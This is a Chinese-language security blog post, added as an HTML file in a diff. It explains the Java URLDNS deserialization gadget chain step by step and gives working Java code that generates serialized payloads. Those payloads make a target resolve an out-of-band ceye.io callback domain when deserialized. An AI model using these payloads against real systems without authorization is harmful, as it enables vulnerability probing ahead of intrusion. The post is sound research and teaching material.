@@ -1,0 +1,298 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>URLDNS调用链 | 1jzz</title>
+<link rel="shortcut icon" href="https://1jzz.github.io/favicon.ico?v=1659229140591">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://1jzz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="URLDNS调用链 | 1jzz - Atom Feed" href="https://1jzz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="介绍
+URLDNS是一条相对来说比较简单的利用链，只依赖jdk中的原生类，没有版本的限制。它不会执行命令，只是进行DNS解析，因此通常用来探测是否存在反序列化漏洞。
+URLDNS利用链调试
+这里触发DNS解析的地方是javaj.net.UR..." />
+    <meta name="keywords" content="java" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://1jzz.github.io">
+  <img class="avatar" src="https://1jzz.github.io/images/avatar.png?v=1659229140591" alt="">
+  </a>
+  <h1 class="site-title">
+    1jzz
+  </h1>
+  <p class="site-description">
+    当人生跌入谷底，剩下的每一步都是向上。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              URLDNS调用链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-05-08
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://1jzz.github.io/tag/gqY7ztfMX/" class="post-tag">
+                  # java
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="介绍">介绍</h1>
+<p>URLDNS是一条相对来说比较简单的利用链，只依赖jdk中的原生类，没有版本的限制。它不会执行命令，只是进行DNS解析，因此通常用来探测是否存在反序列化漏洞。</p>
+<h1 id="urldns利用链调试">URLDNS利用链调试</h1>
+<p>这里触发DNS解析的地方是javaj.net.URL类中的hashCode方法调用了URLStreamHandler类中的hashCode方法，然后再调用了URLStreamHandler类中的getHostAddress方法。执行了如下代码：<br>
+<code>u.hostAddress = InetAddress.getByName(host)</code><br>
+通过<code>InetAddress.getByName()</code>方法来获取该host对应的ip地址。<br>
+调用顺序：</p>
+<ol>
+<li><code>HashMap.readObject()</code>：在反序列化的过程中对键值对通过putVal方法将其恢复成一个HashMap，并且对传入的key调用HashMap.hash()方法</li>
+<li><code>HashMap.hash()</code>：调用了key.hashCode()方法，我们这里传入一个URL对象，所以也就是URL.hashCode()方法</li>
+<li><code>URL.hashCode()</code>：先是对URL类中的hashCode字段进行判断，如果不为-1就会直接返回，而不会调用handler.hashCode方法，也就是说不会触发DNS解析。当我们将URL对象put到了HashMap以后本地会触发一次DNS解析，并且其hashCode字段就已经初始化完毕，其值也会被发送，所以想要在反序列化中触发URLDNS链，需要将URL对象的hashCode字段通过反射置为-1</li>
+<li><code>URLStreamHandler.hashCode()</code>：调用URLStreamHandler.getHostAddress()方法</li>
+<li><code>URLStreamHandler.getHostAddress()</code>：调用InetAddress.getByName(host)方法，对该host进行DNS解析，获取其ip地址</li>
+</ol>
+<h1 id="payload编写">payload编写</h1>
+<p>在本地生成payload时，会触发一次DNS解析，但这次解析可能会对我们测试的结果进行干扰，所以我们可以创建一个URLStreamHandler子类，重写其getHostAddress方法，因为<br>
+handler字段是以<code>transient</code>修饰的，所以handler字段变量不会参与序列化的过程，所以在反序列化时并不会对造成影响。<br>
+除了传入一个子类URLStreamHandler以外，还可以在调用HashCode.put()方法之前，通过反射将hashCode设置为非-1。<br>
+测试代码：<br>
+SilentURLStreamHandler</p>
+<pre><code class="language-java">public class SilentURLStreamHandler extends URLStreamHandler {
+    @Override
+    protected URLConnection openConnection(URL u) throws IOException {
+        return null;
+    }
+
+    @Override
+    protected synchronized InetAddress getHostAddress(URL u) {
+        return null;
+    }
+}
+</code></pre>
+<pre><code class="language-java">public class URLDNSTest {
+    public static void main(String[] args) throws Exception{
+        /*
+        URLStreamHandler handler = new SilentURLStreamHandler();
+        HashMap&lt;URL, String&gt; hashmap = new HashMap&lt;&gt;();
+        URL u = new URL(null, &quot;http://bdzuv0.ceye.io&quot;, handler);
+        hashmap.put(u, &quot;test&quot;);
+
+        Field hashCode = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
+        hashCode.setAccessible(true);
+        hashCode.set(u, -1);
+        serialize(hashmap);
+        */
+        unserialize();
+    }
+
+    public static void serialize(Object obj) throws Exception {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;./urldns.bin&quot;));
+        oos.writeObject(obj);
+        oos.close();
+    }
+
+    public static void unserialize() throws Exception {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;./urldns.bin&quot;));
+        ois.readObject();
+        ois.close();
+    }
+}
+</code></pre>
+<h1 id="其他调用方式">其他调用方式</h1>
+<p>我们发现最终是通过URLStreamHandler.getHostAddress()方法中的InetAddress.getByName(host)方法进行DNS解析的，我们可以查看该方法是否在其他地方进行调用，从而找到不同的利用方式。<br>
+发现该方法不仅在hashCode方法中进行调用，并且还在hostsEqual方法中进行调用。<br>
+反向调用顺序：</p>
+<ol>
+<li><code>URLStreamHandler.getHostAddress()</code></li>
+<li><code>URLStreamHandler.hostEqual()</code>：传入了两个URL对象，并且对这个两个URL中的host都进行dns解析</li>
+<li><code>URLStreamHandler.sameFile()</code>：对两个url中的协议、端口、IP、uri进行比较</li>
+<li><code>URLStreamHandler.equals()</code></li>
+<li><code>URL.equals()</code></li>
+<li><code>HashMap.putVal()</code>：如果putVal两个hash值相同的key，则会调用key.equals方法用于判断这两个对象的是否相等，相等则覆盖，不相等则使用next指向将要放入的元素</li>
+</ol>
+<p>这里的触发的入口点也是重写了readObject方法的HashMap。</p>
+<h1 id="payload编写-2">payload编写</h1>
+<p>先是替换了u的hashcode为1，让u1可以被put到HashMap中(因为hashcode不同，所以无法进入equal方法，所以在序列化的过程中不会造成干扰)，然后再将u1的hashcode设置为1，使其在反序列化的过程中可以进入到key的相等判断语句中，调用hostEqual()方法，从而进行DNS解析。</p>
+<pre><code class="language-java">public class URLDNS2 {
+    public static void main(String[] args) throws Exception {
+        URLStreamHandler handler = new SilentURLStreamHandler();
+        HashMap&lt;URL, String&gt; hashmap = new HashMap&lt;&gt;();
+        URL u = new URL(null, &quot;http://bdzuv0.ceye.io&quot;, handler);
+        URL u1 = new URL(null, &quot;http://bdzuv0.ceye.io&quot;, handler);
+
+        Field hashCode = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
+        hashCode.setAccessible(true);
+        hashCode.set(u, 1);
+
+        hashmap.put(u, &quot;test&quot;);
+        hashmap.put(u1, &quot;test&quot;);
+
+        hashCode.set(u1, 1);
+
+        serialize(hashmap);
+        //unserialize();
+    }
+
+    public static void serialize(Object obj) throws Exception {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;./urldns2.bin&quot;));
+        oos.writeObject(obj);
+        oos.close();
+    }
+
+    public static void unserialize() throws Exception {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;./urldns2.bin&quot;));
+        ois.readObject();
+        ois.close();
+    }
+}
+
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
+<li><a href="#urldns%E5%88%A9%E7%94%A8%E9%93%BE%E8%B0%83%E8%AF%95">URLDNS利用链调试</a></li>
+<li><a href="#payload%E7%BC%96%E5%86%99">payload编写</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F">其他调用方式</a></li>
+<li><a href="#payload%E7%BC%96%E5%86%99-2">payload编写</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://1jzz.github.io/post/Dsj_CV2NE/">
+              <h3 class="post-title">
+                vulnstack2
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  友链： <a href="https://www.cnblogs.com/sherlson/" target="_blank">sherlson</a>、<a href="https://cyberczy.github.io/" target="_blank">cyberczy</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d4b50d1451bf48cde435f45724be67b3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+  <a class="rss" href="https://1jzz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
